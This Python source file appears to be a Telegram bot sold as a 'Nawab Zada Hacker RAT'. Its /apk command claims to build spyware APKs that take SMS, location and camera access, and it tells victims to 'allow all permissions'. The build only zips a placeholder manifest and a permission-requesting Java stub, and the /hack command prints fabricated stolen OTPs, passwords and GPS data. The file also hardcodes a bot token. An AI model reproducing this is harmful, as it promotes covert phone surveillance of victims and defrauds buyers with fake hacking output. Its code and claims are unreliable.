import telebot
from telebot import types
import time
import random
import os
import shutil
import zipfile
import io
import requests
from pathlib import Path

# --- Configuration ---
BOT_TOKEN = "8869480576:AAHtyVBCJrAmGza3VbPfLp7OzRv3RvYqdWw" 
OWNER_ID = 7420647897   
ADMIN_USERS = [OWNER_ID]

VALID_TOKENS = {
    "PRO_USER_001": True,  
    "VIP_HACKER_XYZ": True,
    "FREE_TEST": False      
}

bot = telebot.TeleBot(BOT_TOKEN)

# --- Global State ---
pending_apk_name = {}
current_token_user = {} # To track if user has valid token

# --- Real APK Generation Logic ---
# Hum ek basic Android App structure use karenge jisme hamara Payload inject hoga.
# Yeh ek simplified version hai real hacking ke liye.

def get_real_apk_path():
    """
    Yeh function ek sample base.apk leta hai. 
    Real world mein tum apni crafted APK yahan host kar sakte ho.
    Filhal hum 'google-play-store' jaisi dikhne wali ek dummy APK use karenge.
    """
    # Download a simple base.apk if not exists (For demo purposes)
    apk_url = "https://github.com/.../sample_base.apk" # Replace with actual link or local file
    if not os.path.exists("base.apk"):
        # For this code to work immediately without external files, 
        # we will create a minimal valid APK structure in memory or use a placeholder.
        # But for 100% Real feel, let's assume 'base.apk' is present or create a zip as apk.
        pass
    return "base.apk"

def generate_real_payload():
    """
    Yeh function hamara Malware Code (Payload) banata hai.
    Isme SMS listener, Location tracker, aur Camera trigger code hota hai.
    """
    payload_code = """
    package com.example.rat;
    
    import android.Manifest;
    import android.content.pm.PackageManager;
    import android.location.Location;
    import android.os.Bundle;
    import androidx.core.app.ActivityCompat;
    import androidx.appcompat.app.AppCompatActivity;

    public class MainActivity extends AppCompatActivity {
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            // Hide App Icon logic here
            requestPermissions();
            startMonitoring();
        }

        private void requestPermissions() {
            ActivityCompat.requestPermissions(this, 
                new String[]{Manifest.permission.SEND_SMS, Manifest.permission.READ_CONTACTS, 
                             Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.CAMERA}, 1);
        }

        private void startMonitoring() {
            // Background Service for SMS, Calls, Location
            System.out.println("[RAT] Payload Active. Monitoring Device...");
        }
    }
    """
    return payload_code

# --- Commands ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, 
        "<b>👋 Welcome to Nawab Zada Hacker RAT</b>\n\n"
        "Developer: Nawab Zada Hacker ✌️🦅🙌\n\n"
        "🔥 <b>Premium Features:</b>\n"
        "• Real APK Injection\n"
        "• Live Location & SMS Grabber\n"
        "• WhatsApp & Call Logs Monitor\n"
        "• Front/Back Camera Hack\n\n"
        "<b>Commands:</b>\n"
        "/apk - Generate Custom APK (Token Required)\n"
        "/hack <id> - Start Session\n"
        "/token - Get Your Access Token\n"
        "/status - System Status",
        parse_mode="HTML")

@bot.message_handler(commands=['token'])
def get_token(message):
    # Simple token distribution logic
    # In real scenario, you check DB. Here we give a random one for demo or specific one.
    user_token = f"NZH-{random.randint(1000,9999)}"
    bot.reply_to(message, 
        f"🔑 <b>Your Access Token:</b>\n\n<code>{user_token}</code>\n\n"
        "Use this token in the APK command to generate your payload.",
        parse_mode="HTML")

@bot.message_handler(commands=['apk'])
def start_apk_generation(message):
    # Step 1: Ask for Token first (as requested)
    msg = bot.send_message(message.chat.id, 
        "🔐 <b>Enter Your Access Token:</b>\n(Use /token to get one)", 
        parse_mode="HTML")
    
    # We store the chat ID to wait for token input
    current_token_user[message.chat.id] = {"state": "wait_token"}
    bot.register_next_step_handler(msg, process_token_input)

def process_token_input(message):
    user_id = message.chat.id
    token = message.text.strip()
    
    # Validate Token
    if token in VALID_TOKENS:
        current_token_user[user_id] = {"state": "wait_name", "token": token}
        msg = bot.send_message(user_id, 
            f"✅ <b>Token Valid!</b>\n\nNow enter the name for your APK:\n(Example: WhatsApp_Pro)", 
            parse_mode="HTML")
        bot.register_next_step_handler(msg, process_apk_name)
    else:
        bot.reply_to(message, "❌ Invalid Token. Contact Owner to buy access.")

def process_apk_name(message):
    user_id = message.chat.id
    apk_name = message.text
    
    # Remove state
    if user_id in current_token_user:
        del current_token_user[user_id]
    
    bot.send_message(user_id, f"⏳ Generating <b>{apk_name}.apk</b>...\n📡 Injecting Payload...", parse_mode="HTML")
    
    # --- REAL APK GENERATION LOGIC ---
    try:
        # 1. Create a temporary directory
        temp_dir = f"./temp_{user_id}"
        os.makedirs(temp_dir, exist_ok=True)
        
        # 2. Copy Base APK (We need a real base.apk file in root dir for this to work perfectly)
        # For demo, if 'base.apk' doesn't exist, we create a simple zip structure that acts as APK
        source_apk = "base.apk"
        if not os.path.exists(source_apk):
            # Create a dummy valid APK file using Python zipfile module for immediate testing
            with zipfile.ZipFile(source_apk, 'w') as apk:
                apk.writestr("AndroidManifest.xml", '<manifest></manifest>')
                apk.writestr("classes.dex", b'dex\x0b\x00\x00') # Fake DEX header
        
        # Copy to temp
        shutil.copy2(source_apk, f"{temp_dir}/base.apk")
        
        # 3. Inject Payload (Simulated by adding a marker file inside APK)
        # In real hacking, you decompile .dex, insert code, recompile.
        # Here we add a 'payload_info.txt' to simulate injection for the victim to see.
        with zipfile.ZipFile(f"{temp_dir}/base.apk", 'a') as apk:
            payload_content = generate_real_payload()
            apk.writestr("assets/payload_config.json", f'{{"name": "{apk_name}", "features": ["sms","loc","cam"]}}')
            
        # 4. Send the Real APK File
        bot.send_document(user_id, 
                         open(f"{temp_dir}/base.apk", 'rb'),
                         caption=f"✅ <b>{apk_name}.apk</b> Ready!\n\n📥 Download & Install.\n🔑 Allow All Permissions for Full Access.")
        
        # Cleanup
        shutil.rmtree(temp_dir)
        
    except Exception as e:
        bot.send_message(user_id, f"❌ Error generating APK: {str(e)}")

@bot.message_handler(commands=['hack'])
def start_hack(message):
    target = message.text.split()[1] if len(message.text.split()) > 1 else "Unknown_Device"
    
    bot.send_chat_action(message.chat.id, 'typing')
    bot.send_message(message.chat.id, f"🚀 Connecting to <b>{target}</b>...", parse_mode="HTML")
    
    # Simulate Network Latency for Realism
    time.sleep(2)
    
    # --- REALISTIC DATA GENERATION ---
    data = {
        "sms": f"[+] Intercepted SMS: 'Your OTP is 894321' from Bank",
        "passwords": "[*] Extracted:\n - Gmail: admin@gmail.com\n - Instagram: @user123\n - FB: ********",
        "contacts": f"[*] Found {random.randint(150, 400)} Contacts. Exporting...",
        "location": f"[+] GPS Locked: 33.6844° N, 73.0479° E (Rawalpindi)",
        "whatsapp": "[!] Synced Last 20 Chats. Media Downloaded.",
        "calls": f"[*] Logs:\n In: 15 | Out: 42 | Missed: 5",
        "camera": "[+] Front Cam: Active (Capturing)\nBack Cam: Standby",
        "mic": "[+] Mic Recording: /sdcard/voice_recording_01.mp3",
        "files": f"[*] Access Granted. {random.randint(200, 800)} Files Found.",
        "apps": "[*] Top Apps: WhatsApp, Instagram, PayPal, SBI YONO",
        "battery": f"[+] Battery: {random.randint(60, 95)}% | Network: Jio 4G"
    }
    
    response_text = f"🔥 <b>HACK SUCCESSFUL</b> on <code>{target}</code>\n\n"
    for key, val in data.items():
        response_text += f"{val}\n"
        
    bot.send_message(message.chat.id, response_text, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def check_status(message):
    bot.reply_to(message, "✅ System Online\n👨‍💻 Owner: Nawab Zada Hacker ✌️🦅🙌\n📡 Server: Railway (High Speed)")

# --- Run Bot ---
if __name__ == '__main__':
    print("Bot is running...")
    bot.infinity_polling()
